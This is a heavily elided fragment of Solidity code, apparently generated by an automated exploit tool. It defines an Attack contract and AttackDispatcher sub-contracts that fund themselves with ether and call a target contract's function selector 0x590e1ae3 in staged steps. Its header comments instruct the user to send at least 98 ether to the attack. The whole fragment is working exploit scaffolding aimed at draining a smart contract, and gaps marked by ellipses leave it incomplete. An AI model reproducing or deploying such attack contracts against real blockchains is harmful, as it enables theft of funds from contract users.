 ...
 * parameter. Make sure to send at least 98 ether and 0 wei to the attack
 ...
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x393ef1a5127c80000 wei
 *
 */
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x1bc16d674ec800000;
            ...
            if (id == 4) {
                 ...
                 */
                bytes memory data = bytes(hex"590e1ae3");
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x55005f0c614480000; /* equals 98 ether and 0 wei */
    uint constant INITIAL_ETHER = 0x393ef1a5127c80000;
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate[1] = 0;
        rstate[2] = 0;
        subs[4] = new AttackDispatcher{value: 32000000000000000000 }(4, _targets);
    }
